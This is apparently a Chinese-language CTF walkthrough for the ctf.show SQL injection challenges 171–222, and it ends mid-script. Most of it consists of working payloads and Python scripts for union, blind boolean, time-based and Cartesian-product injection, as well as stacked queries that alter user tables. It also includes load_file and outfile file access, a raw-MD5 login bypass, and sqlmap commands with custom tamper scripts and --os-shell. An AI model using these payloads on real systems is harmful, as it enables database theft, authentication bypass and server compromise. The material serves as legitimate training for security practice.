[toc]

# sql注入全文章

[sql注入全文章](https://kradress.github.io/2021/11/28/SQL%E6%B3%A8%E5%85%A5.html)

# 171 万能语句

```
原sql:
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
payload:
1'||1%23
sql拼接后：
select username,password from user where username !='flag' and id = '1'||1#' limit 1;";

%23 = #
```

# 172 联合查询 表查询

```
万能语句
1'||1%23
发现没有在ctfshow_user里面

联合查询，查询有哪些表
1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()

发现还有一张表ctfshow_user
联合查询ctfshow_user表
1' union select password,2,3 from ctfshow_user2 %23

查询出flag
```

# 173 base64编码，反转，hex编码

```
payload1:api/v3.php?id=0' union select 1,hex(password),3 from ctfshow_user3 %23
payload2:api/v3.php?id=0' union select 1,to_base64(password),3 from ctfshow_user3 %23
payload3:id=0' union select reverse(password),2,3 from ctfshow_user3%23
```

# 174 mysql replace 函数

```
http://8becabfe-8853-4ced-b71d-5f8fff533fb5.challenge.ctf.show/api/v4.php?id=1' union select 'a',substr(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,0,'!'),1,'@'),2,']'),3,'$'),4,'_'),5,'^'),6,'='),7,'*'),8,'('),9,')'),5)from ctfshow_user4 where username='flag'%23
```

# 175 时间盲注 查询输出到文件

**时间盲注**

```
'or if(substr(password,9,1)='8',sleep(1),0)%23
```

```python
# author:yu22x
import requests
import time
import string

str = string.digits + string.ascii_lowercase + "{-}"
url = 'http://e804cdee-a3b9-4508-bba6-9c6e6b8ef10a.challenge.ctf.show/api/v5.php?id='
flag = ''

for i in range(1, 50):
    # print(i)
    for j in str:
        payload = "0' or ( username='flag' and if(substr(password,{},1)='{}',sleep(1),0))%23".format(i, j)
        stime = time.time()
        # print(url + payload)
        r = requests.get(url + payload)
        etime = time.time()
        if etime - stime >= 1:
            flag += j
            print(flag)
            break
```

**文件输出**

```
1' union select 1,password from ctfshow_user5 where username = 'flag'  into outfile '/var/www/html/ctf.txt' -- A
```

# 176 

```
万能sql
1'||1%23
```

```
过滤了小写的select
id=0' union SELECT password,2,3 from ctfshow_user%23
```

# 177 空格过滤 /**/ ()

```
万能sql
1'||1%23
```

```
payload1:id=0'/**/union/**/SELECT/**/password,2,3/**/from/**/ctfshow_user%23
payload2:id=0'union/**/SELECT(password),2,(3)from(ctfshow_user)%23
```

# 178 空格过滤 %0a %09

```
万能sql
1'||1%23
```

```
payload1:id=0'%0aunion%0aSELECT%0apassword,2,3%0afrom%0actfshow_user%23
payload2:id=0'%09union%09SELECT%09password,2,3%09from%0actfshow_user%23
```

# 179 万能sql

# 180 || 

```
原sql:
select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;
payload:
id=0'||username='flag
拼接后：
select id,username,password from ctfshow_user where username !='flag' and id = 'id=0'||username='flag' limit 1;
```

# 181 182 regexp 正则

```
id=0'||(username)regexp'f
```

# 183 regexp 正则盲注

脚本

```python
# author:yu22x
import requests
import string

url = "http://26978aaf-fc60-4456-ab1f-4b7bc23b3aac.challenge.ctf.show/select-waf.php"
s = string.digits + string.ascii_lowercase + "{_-}"
flag = ''
for i in range(1, 45):
    # print(i)
    for j in s:
        # print(f'(ctfshow_user)where(pass)regexp("^ctfshow{flag + j}")')
        data = {
            'tableName': f'(ctfshow_user)where(pass)regexp("^ctfshow{flag + j}")'
        }
        # print(data)
        r = requests.post(url, data=data)
        # print(r.text)
        if ("user_count = 1" in r.text):
            flag += j
            print(flag)
            break
```

# 184  having regexp 盲注 16进制编码

脚本

```python
#author:yu22x
import requests
import string
url="http://87d32c88-6000-4c76-bf95-b58baed44631.challenge.ctf.show/select-waf.php"
s=string.digits+string.ascii_lowercase+"{_-}"
def asc2hex(s):
    a1 = ''
    a2 = ''
    for i in s:
        a1+=hex(ord(i))
    a2 = a1.replace("0x","")
    return a2
flag=''
for i in range(1,45):
  print(i)
  for j in s:
    d = asc2hex(f'^ctfshow{flag+j}')
    data={
    'tableName':f' ctfshow_user group by pass having pass regexp(0x{d})'
    }
    #print(data)
    r=requests.post(url,data=data)
    #print(r.text)
    if("user_count = 1"  in r.text):
      flag+=j
      print(flag)
      break
```

# 185 186 true拼装char 正则盲注

regexp()：函数

concat()：函数

char()：函数

脚本

```python
# author:yu22x
import requests
import string

url = "http://955c4204-b9de-433c-931d-5f7a0d9f0c51.challenge.ctf.show/select-waf.php"
s = '0123456789abcdef-{}'


def convert(strs):
    t = 'concat('
    for s in strs:
        t += 'char(true' + '+true' * (ord(s) - 1) + '),'
    return t[:-1] + ")"


flag = ''
for i in range(1, 45):
    print(i)
    for j in s:
        d = convert(f'^ctfshow{flag + j}')
        data = {
            'tableName': f' ctfshow_user group by pass having pass regexp({d})'
        }
        # print(data)
        r = requests.post(url, data=data)
        # print(r.text)
        if ("user_count = 1" in r.text):
            flag += j
            print(flag)
            if j == '}':
                exit(0)
            break


def convert(strs):
    t = 'concat('
    for s in strs:
        t += 'char(true' + '+true' * (ord(s) - 1) + '),'
    return t[:-1] + ")"

```

拼出来的sql

```
{'tableName': ' ctfshow_user group by pass having pass regexp(concat(char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true)))'}
```

# 187 md5 绕过

sql

```
select count(*) from ctfshow_user where username = '$username' and password= '$password'
```

代码

```
    $username = $_POST['username'];
    $password = md5($_POST['password'],true);

    //只有admin可以获得flag
    if($username!='admin'){
        $ret['msg']='用户名不存在';
        die(json_encode($ret));
    }
```

username = admin

MD5 函数第二个参数为true返回值为true，MD5()只要算出'or'就算过

password = ffifdyop

# 188 php intval(0)

sql

```
select pass from ctfshow_user where username = {$username}
```

username payload

```
1||1
```

过滤

```
 //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
  }
  payload:
  password = 0
  $row['pass']：字符串转int值，会直接转为0
```

# 189 load_file 布尔盲注

> ascii()：输入字符串，返回ascii码

```python
#author:yu22x
import requests
import string
url="http://d2577b14-e91d-4f5e-b23a-73ff43862cec.challenge.ctf.show/api/index.php"
s=string.printable
flag=''
for i in range(1,1000):
    print(i)
    for j in range(32,128):
        #print(chr(j))
        # 加载文件
        # 文件的第i个字符等于char的第j个字符?等就返回1，不等就返回0
        data={'username':f"if(ascii(substr(load_file('/var/www/html/api/index.php'),{i},1))={j},1,0)",
'password':'1'}
        #print(data)
        r=requests.post(url,data=data)
        #print(r.text)
        # \\u67e5\\u8be2\\u5931\\u8d25是汉字：查询失败
        if("\\u67e5\\u8be2\\u5931\\u8d25" in r.text):
            flag+=chr(j)  
            print(flag)
            break
```

# 190 布尔盲注

```python
# author:yu22x
import requests
import string

url = "http://88e7b6b1-399a-4f94-bebf-f24349205c4b.challenge.ctf.show/api/index.php"
s = string.ascii_letters + string.digits
flag = ''
for i in range(1, 45):
    # print(i)
    for j in range(32, 128):
        # 跑库名
        data = {
            'username': f"'||if(ascii(substr(database(),{i},1))={j},1,0)#",
            'password': '1'
        }

        # 跑表名
        # data = {
        #     'username': f"'||if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))={j},1,0)#",
        #     'password': '1'
        # }

        # 跑列名
        # data = {
        #     'username': f"'||if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_fl0g'),{i},1))={j},1,0)#",
        #     'password': '1'
        # }
        # 跑数据
        # data = {
        #     'username': f"'||if(ascii(substr((select f1ag from ctfshow_fl0g),{i},1))={j},1,0)#",
        #     'password': '1'
        # }
        r = requests.post(url, data=data)
        if ("\\u5bc6\\u7801\\u9519\\u8bef" in r.text):
            flag += chr(j)
            print(flag)
            break
```

# 191 布尔盲注 ord函数

> ord()：函数与ascii()函数效果相同

```python
# author:yu22x
import requests
import string

url = "http://88e7b6b1-399a-4f94-bebf-f24349205c4b.challenge.ctf.show/api/index.php"
s = string.ascii_letters + string.digits
flag = ''
for i in range(1, 45):
    # print(i)
    for j in range(32, 128):
        # 跑数据
        # data = {
        #     'username': f"'||if(ord(substr((select f1ag from ctfshow_fl0g),{i},1))={j},1,0)#",
        #     'password': '1'
        # }
        r = requests.post(url, data=data)
        if ("\\u5bc6\\u7801\\u9519\\u8bef" in r.text):
            flag += chr(j)
            print(flag)
            break
```

# 192 布尔盲注 chr()

> chr():将数字转为char字符串

```python
#author:yu22x
import requests
import string
url="http://eb1ea450-7ad8-4a93-a682-4cdb5cf1adff.challenge.ctf.show/api/index.php"
s=string.ascii_letters+string.digits
flag=''
for i in range(1,45):
    print(i)
    for j in range(32,128):
        #跑数据
        data={
            'username':f"'||if((substr((select f1ag from ctfshow_fl0g),{i},1))='{chr(j)}',1,0)#",
            'password':'1'
        }
        r=requests.post(url,data=data)
        if("\\u5bc6\\u7801\\u9519\\u8bef" in r.text):
            flag+=chr(j)  
            print(flag)
            break
```

# 193 194 布尔盲注 mid()

> min():和substr效果相同

```python
#author:yu22x
import requests
import string
url="http://eb1ea450-7ad8-4a93-a682-4cdb5cf1adff.challenge.ctf.show/api/index.php"
s=string.ascii_letters+string.digits
flag=''
for i in range(1,45):
    print(i)
    for j in range(32,128):

        #跑表名
        # data={
        #     'username':f"'||if((mid((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))='{chr(j)}',1,0)#",
        #     'password':'1'
        # }

        #跑列名
        # data={
        #     'username':f"'||if((mid((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_fl0g'),{i},1))='{chr(j)}',1,0)#",
        #     'password':'1'
        # }
        #跑数据
        data={
            'username':f"'||if((mid((select f1ag from ctfshow_flxg),{i},1))='{chr(j)}',1,0)#",
            'password':'1'
        }
        r=requests.post(url,data=data)
        if("\\u5bc6\\u7801\\u9519\\u8bef" in r.text):
            flag+=chr(j)  
            print(flag)
            break
```

# 195 堆叠注入 update

```
原sql:
select pass from ctfshow_user where username = {$username};
payload:
0;update`ctfshow_user`set`pass`=1
拼接后：
select pass from ctfshow_user where username = 0;update`ctfshow_user`set`pass`=1
变为两条sql堆叠
```

# 196 堆叠注入 select

```
// 写着过滤了select，实际上没有，所以说到底过滤了什么还得靠自己fuzz
0;select(1)
0
```

# 197 198 堆叠注入 insert

```
原sql:
select pass from ctfshow_user where username = {$username};
payload:
0;insert ctfshow_user(`username`,`pass`) value(1,2);
拼接后:
select pass from ctfshow_user where username = 0;insert ctfshow_user(`username`,`pass`) value(1,2);
就可以用1,2直接登录
```

# 199 200 堆叠注入 show tables

```
username:1;show tables
password:ctfshow_user
```

# 201 sqlmap

==看sqlmap参数文档和sqlmap超详细笔记==

# 207 space2comment插件

```
// 空格转义插件
--tamper space2comment.py
```

# 208 209 space2%09.py,equaltolike.py

space2%09.py自定义插件

将space2comment.py改造

```
retVal += "/**/" -> retVal += chr(9)
```

equaltolike.py插件

将=替换为like

# 210 自定义插件 双重base64加密

```python
# 基于 base64encode.py 修改
#!/usr/bin/env python

from lib.core.convert import encodeBase64
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def reverse(x):
	y=x[::-1]
	y=list(x)
	y.reverse()
	y=''.join(y)
	return y

def tamper(payload, **kwargs):
    payload = reverse(payload)
    payload = encodeBase64(payload, binary=False)
    payload = reverse(payload)
    payload = encodeBase64(payload, binary=False)
    return payload
```

```
payload：
python3 sqlmap.py -u 'http://59568d89-fda0-4303-92b6-5e8b185f459e.challenge.ctf.show/api/index.php' --method='PUT' --data='id=1'  -p 'id' --referer='ctf.show' -current-db --dump --headers="Content-Type: text/plain"  --safe-url='http://59568d89-fda0-4303-92b6-5e8b185f459e.challenge.ctf.show/api/getToken.php' --safe-freq=1 --tamper two_base64.py
```

# 211 212 多脚本顺序使用

payload

```
python3 sqlmap.py -u 'http://1139cf9a-be73-4d90-9dc9-875e0b9369a0.challenge.ctf.show/api/index.php' --method='PUT' --data='id=1'  -p 'id' --referer='ctf.show' -current-db --dump --headers="Content-Type: text/plain"  --safe-url='http://1139cf9a-be73-4d90-9dc9-875e0b9369a0.challenge.ctf.show/api/getToken.php' --safe-freq=1 --tamper 'space2%09.py,two_base64.py' -v 3
```

# 213 --os-shell

payload

```
python3 sqlmap.py -u 'http://e6109a12-63a4-4fc1-adf9-76f8e5678537.challenge.ctf.show/api/index.php' --method='PUT' --data='id=1'  -p 'id' --referer='ctf.show' -current-db --dump --headers="Content-Type: text/plain"  --safe-url='http://e6109a12-63a4-4fc1-adf9-76f8e5678537.challenge.ctf.show/api/getToken.php' --safe-freq=1 --tamper 'space2%09.py,two_base64.py' --os-shell -v 1
```

# 216 时间盲注

```Python
# author:yu22x
import requests
import time
import string

str = string.digits + string.ascii_lowercase + "{-}"
url = 'http://fe33a43b-75a1-4fc1-91cc-8527454b00da.challenge.ctf.show/api/'
flag = ''

for i in range(1, 46):
    print(i)
    for j in range(32, 126):
        # 表名
        # payload = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        # 列名
        # payload = 'select group_concat(column_name) from information_schema.columns where table_name="ctfshow_flagxc"'
        # 值
        payload = 'select group_concat(flagaac) from ctfshow_flagxcc'
        data = {
            'ip': f"'MQ==') or if(ascii(substr(({payload}), {i}, 1))={j},sleep(5), 1",
            'debug': 0
        }
        # print(data)
        stime = time.time()
        # print(url + payload)
        r = requests.post(url, data=data)
        etime = time.time()
        if etime - stime >= 5:
            flag += chr(j)
            print(flag)
            break
```

# 217 benchmark

```
# author:yu22x
import requests
import time
import string

str = string.digits + string.ascii_lowercase + "{-}"
url = 'http://fe33a43b-75a1-4fc1-91cc-8527454b00da.challenge.ctf.show/api/'
flag = ''

for i in range(1, 46):
    print(i)
    for j in range(32, 126):
        # 表名
        # payload = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        # 列名
        # payload = 'select group_concat(column_name) from information_schema.columns where table_name="ctfshow_flagxc"'
        # 值
        payload = 'select group_concat(flagaac) from ctfshow_flagxcc'
        data = {
            'ip': f"'MQ==') or if(ascii(substr(({payload}), {i}, 1))={j},benchmark(1000000,md5(1)), 1",
            'debug': 0
        }
        # print(data)
        stime = time.time()
        # print(url + payload)
        r = requests.post(url, data=data)
        etime = time.time()
        if etime - stime >= 5:
            flag += chr(j)
            print(flag)
            break

```

# 218 219 笛卡尔积盲注

```python
import time

import requests

url = "http://c887df7a-485a-4828-89e3-abb579f63434.challenge.ctf.show/api/"

strr = "1234567890{}-qazwsxedcrfvtgbyhnujmikolp,"
# payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"
# payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxca' limit 1,1"
payload = "select flagaabc from ctfshow_flagxca"
cnt = 1
res = ""
while True:
    print(cnt)
    for i in strr:
        data = {
            'ip': f"1) or if(substr(({payload}),{cnt},1)='{i}',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H, information_schema.schemata I),1",
            'debug': '1'
        }
        try:
            r = requests.post(url, data=data, timeout=2)
        except Exception as e:
            res += i
            print('[*]' + res)
            cnt += 1
            time.sleep(3)
            break
```

# 220 笛卡尔积盲注 left

```python
import time

import requests

url = "http://acf6340e-22ce-49a3-b3e6-69dfabe9ba58.challenge.ctf.show/api/"

strr = "_1234567890{}-qazwsxedcrfvtgbyhnujmikolp"
# payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"
# payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"
payload = "select flagaabcc from ctfshow_flagxcac"
cnt = 1
res = ""
while True:
    print(cnt)
    for i in strr:
        res += i
        data = {
            'ip': f"1) or if(left(({payload}),{cnt})='{res}',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H),1",
            'debug': '1'
        }
        # print(i)
        try:
            r = requests.post(url, data=data, timeout=0.5)
            res = res[:-1]
        except Exception as e:
            print('[*]' + res)
            cnt += 1
            time.sleep(3)
            break
```

# 221 limit ExtractValue报错注入

[p神文章](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)

```
原sql
//分页查询
$sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;
```

> 利用procedure analyse()函数优化表结构。
>
> > procesure analyse(max_elements,max_memory)
> > max_elements
> > 指定每列非重复值的最大值，当超过这个值的时候，MySQL不会推荐enum类型。
> > max_memory
> > analyse()为每列找出所有非重复值所采用的最大内存大小。
>
> 利用 ExtractValue 的报错，获得数据库名。
>
> > ExtractValue(xml_frag, xpath_expr),接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。

```
payload:
/api/?page=1&limit=1 procedure analyse(extractvalue(1,concat(0x7e,database(),0x7e)),1)

注：0x7e是~
```

# 222 group by 盲注

```python
import requests

url = 'http://46379f6e-0d68-42ba-8b5f-00aee565063b.challenge.ctf.show/api/'
flag = ''
i = 0

while True:
    start = 32
    tail = 127
    i += 1

    while start < tail:
        mid = (start + tail) >> 1
        # payload = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'"
        payload = 'select concat(flagaabc) from ctfshow_flaga'
